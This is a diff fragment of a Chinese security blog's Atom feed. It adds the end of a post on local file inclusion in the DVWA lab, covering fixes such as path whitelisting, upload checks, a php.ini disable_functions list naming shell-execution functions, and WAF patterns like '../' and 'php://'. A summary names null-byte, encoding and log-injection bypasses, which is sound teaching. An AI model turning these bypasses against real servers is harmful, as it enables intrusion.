class=&#34;hljs-string&#34;&gt;&amp;quot;pages/&lt;span class=&#34;hljs-subst&#34;&gt;$page&lt;/span&gt;&amp;quot;&lt;/span&gt;);&lt;br&gt;&amp;#125; &lt;span class=&#34;hljs-keyword&#34;&gt;else&lt;/span&gt; &amp;#123;&lt;br&gt;    &lt;span class=&#34;hljs-keyword&#34;&gt;die&lt;/span&gt;(&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;非法路径！&amp;quot;&lt;/span&gt;);&lt;br&gt;&amp;#125;&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;文件上传校验&lt;/strong&gt;：&lt;figure class=&#34;highlight php&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs php&#34;&gt;&lt;span class=&#34;hljs-variable&#34;&gt;$finfo&lt;/span&gt; = &lt;span class=&#34;hljs-title function_ invoke__&#34;&gt;finfo_open&lt;/span&gt;(FILEINFO_MIME_TYPE);&lt;br&gt;&lt;span class=&#34;hljs-variable&#34;&gt;$mime&lt;/span&gt; = &lt;span class=&#34;hljs-title function_ invoke__&#34;&gt;finfo_file&lt;/span&gt;(&lt;span class=&#34;hljs-variable&#34;&gt;$finfo&lt;/span&gt;, &lt;span class=&#34;hljs-variable&#34;&gt;$_FILES&lt;/span&gt;[&lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;file&amp;#x27;&lt;/span&gt;][&lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;tmp_name&amp;#x27;&lt;/span&gt;]);&lt;br&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt; (!&lt;span class=&#34;hljs-title function_ invoke__&#34;&gt;in_array&lt;/span&gt;(&lt;span class=&#34;hljs-variable&#34;&gt;$mime&lt;/span&gt;, [&lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;image/jpeg&amp;#x27;&lt;/span&gt;, &lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;image/png&amp;#x27;&lt;/span&gt;])) &amp;#123;&lt;br&gt;    &lt;span class=&#34;hljs-keyword&#34;&gt;die&lt;/span&gt;(&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;仅允许图片！&amp;quot;&lt;/span&gt;);&lt;br&gt;&amp;#125;&lt;br&gt;&lt;span class=&#34;hljs-variable&#34;&gt;$newname&lt;/span&gt; = &lt;span class=&#34;hljs-title function_ invoke__&#34;&gt;uniqid&lt;/span&gt;() . &lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;.jpg&amp;#x27;&lt;/span&gt;;&lt;br&gt;&lt;span class=&#34;hljs-title function_ invoke__&#34;&gt;move_uploaded_file&lt;/span&gt;(&lt;span class=&#34;hljs-variable&#34;&gt;$_FILES&lt;/span&gt;[&lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;file&amp;#x27;&lt;/span&gt;][&lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;tmp_name&amp;#x27;&lt;/span&gt;], &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;Uploads/&lt;span class=&#34;hljs-subst&#34;&gt;$newname&lt;/span&gt;&amp;quot;&lt;/span&gt;);&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h3 id=&#34;2-服务器配置&#34;&gt;&lt;a href=&#34;#2-服务器配置&#34; class=&#34;headerlink&#34; title=&#34;2. 服务器配置&#34;&gt;&lt;/a&gt;2. 服务器配置&lt;/h3&gt;&lt;ul&gt;
+&lt;li&gt;&lt;strong&gt;禁用远程包含&lt;/strong&gt;：&lt;figure class=&#34;highlight ini&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs ini&#34;&gt;&lt;span class=&#34;hljs-attr&#34;&gt;allow_url_include&lt;/span&gt; = &lt;span class=&#34;hljs-literal&#34;&gt;Off&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-attr&#34;&gt;allow_url_fopen&lt;/span&gt; = &lt;span class=&#34;hljs-literal&#34;&gt;Off&lt;/span&gt;&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;限制目录访问&lt;/strong&gt;：&lt;figure class=&#34;highlight ini&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs ini&#34;&gt;&lt;span class=&#34;hljs-attr&#34;&gt;open_basedir&lt;/span&gt; = /var/www/html/&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;禁用危险函数&lt;/strong&gt;：&lt;figure class=&#34;highlight ini&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs ini&#34;&gt;&lt;span class=&#34;hljs-attr&#34;&gt;disable_functions&lt;/span&gt; = system,exec,shell_exec,passthru,proc_open&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;Nginx 限制&lt;/strong&gt;：&lt;figure class=&#34;highlight nginx&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs nginx&#34;&gt;&lt;span class=&#34;hljs-section&#34;&gt;location&lt;/span&gt; /Uploads/ &amp;#123;&lt;br&gt;    &lt;span class=&#34;hljs-section&#34;&gt;location&lt;/span&gt; &lt;span class=&#34;hljs-regexp&#34;&gt;~ \.php$&lt;/span&gt; &amp;#123;&lt;br&gt;        &lt;span class=&#34;hljs-attribute&#34;&gt;deny&lt;/span&gt; all;&lt;br&gt;    &amp;#125;&lt;br&gt;&amp;#125;&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h3 id=&#34;3-WAF-部署&#34;&gt;&lt;a href=&#34;#3-WAF-部署&#34; class=&#34;headerlink&#34; title=&#34;3. WAF 部署&#34;&gt;&lt;/a&gt;3. WAF 部署&lt;/h3&gt;&lt;ul&gt;
+&lt;li&gt;拦截异常路径（如 &lt;code&gt;../&lt;/code&gt;、&lt;code&gt;php://&lt;/code&gt;）。&lt;/li&gt;
+&lt;li&gt;检测包含 PHP 代码的上传文件。&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h3 id=&#34;4-日志监控&#34;&gt;&lt;a href=&#34;#4-日志监控&#34; class=&#34;headerlink&#34; title=&#34;4. 日志监控&#34;&gt;&lt;/a&gt;4. 日志监控&lt;/h3&gt;&lt;ul&gt;
+&lt;li&gt;监控 Web 服务器日志，关注异常请求。&lt;/li&gt;
+&lt;li&gt;定期扫描上传目录，删除可疑文件。&lt;/li&gt;
+&lt;/ul&gt;
+&lt;hr&gt;
+&lt;h2 id=&#34;七、总结&#34;&gt;&lt;a href=&#34;#七、总结&#34; class=&#34;headerlink&#34; title=&#34;七、总结&#34;&gt;&lt;/a&gt;七、总结&lt;/h2&gt;&lt;table&gt;
+&lt;thead&gt;
+&lt;tr&gt;
+&lt;th&gt;项目&lt;/th&gt;
+&lt;th&gt;信息&lt;/th&gt;
+&lt;/tr&gt;
+&lt;/thead&gt;
+&lt;tbody&gt;&lt;tr&gt;
+&lt;td&gt;&lt;strong&gt;漏洞类型&lt;/strong&gt;&lt;/td&gt;
+&lt;td&gt;本地文件包含（LFI）&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;&lt;strong&gt;靶场&lt;/strong&gt;&lt;/td&gt;
+&lt;td&gt;DVWA&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;&lt;strong&gt;利用方式&lt;/strong&gt;&lt;/td&gt;
+&lt;td&gt;读取文件、结合上传实现 RCE&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;&lt;strong&gt;绕过技巧&lt;/strong&gt;&lt;/td&gt;
+&lt;td&gt;Null 字节、编码、日志注入&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;&lt;strong&gt;危害&lt;/strong&gt;&lt;/td&gt;
+&lt;td&gt;信息泄露、服务器完全控制&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;&lt;strong&gt;修复核心&lt;/strong&gt;&lt;/td&gt;
+&lt;td&gt;白名单校验、路径限制、上传过滤&lt;/td&gt;
+&lt;/tr&gt;
+&lt;/tbody&gt;&lt;/table&gt;
+&lt;p&gt;LFI 漏洞因其简单性和高危害性而广受关注。DVWA 的 LFI 模块通过动态包含用户输入的文件，展示了漏洞的典型触发方式。攻击者可读取敏感文件或结合文件上传、日志注入等实现 RCE。开发者应采用白名单机制、严格路径校验、限制上传文件执行，并部署 WAF 和日志监控，构建多层次防御体系。&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;&lt;strong&gt;免责声明&lt;/strong&gt;：本文内容仅供合法授权的渗透测试和安全研究，严禁用于非法用途！&lt;/p&gt;
+&lt;/blockquote&gt;
+</content>
+        <category term="Web安全" />
+        <category term="漏洞利用" />
+        <category term="LFI" />
+        <category term="DVWA" />
+        <category term="安全防护" />
+        <updated>2025-08-07T11:03:45.000Z</updated>
+    </entry>
     <entry>
         <id>https://bae-ace.github.io/2025/08/06/%E6%9C%AC%E5%9C%B0%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%EF%BC%88LFI%EF%BC%89%E4%B8%8E%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E8%81%94%E5%8A%A8%E5%AE%9E%E7%8E%B0-RCE/</id>
         <title>本地文件包含（LFI）与文件上传漏洞联动实现 RCE</title>
@@ -318,8 +571,8 @@
 </content>
         <category term="Web安全" />
         <category term="Vulhub" />
-        <category term="RCE" />
         <category term="文件上传" />
+        <category term="RCE" />
         <category term="蚁剑" />
         <category term="LFI" />
         <updated>2025-08-06T13:43:58.000Z</updated>
@@ -527,8 +780,8 @@
 </content>
         <category term="Web安全" />
         <category term="Vulhub" />
-        <category term="RCE" />
         <category term="文件上传" />
+        <category term="RCE" />
         <category term="Nginx" />
         <category term="PHP-FPM" />
         <category term="蚁剑" />
@@ -1185,8 +1438,8 @@
 </content>
         <category term="Web安全" />
         <category term="漏洞复现" />
-        <category term="Struts2" />
         <category term="RCE" />
+        <category term="Struts2" />
         <category term="OGNL注入" />
         <updated>2025-08-03T12:49:30.000Z</updated>
     </entry>
@@ -2729,8 +2982,8 @@
 </content>
         <category term="Web安全" />
         <category term="漏洞复现" />
-        <category term="Struts2" />
         <category term="RCE" />
+        <category term="Struts2" />
         <category term="OGNL注入" />
         <updated>2025-07-24T00:10:34.000Z</updated>
     </entry>
@@ -2920,8 +3173,8 @@
 &lt;/blockquote&gt;
 </content>
         <category term="Web安全" />
-        <category term="SQL注入" />
         <category term="渗透测试" />
+        <category term="SQL注入" />
         <category term="网络安全" />
         <updated>2025-07-23T23:51:59.000Z</updated>
     </entry>
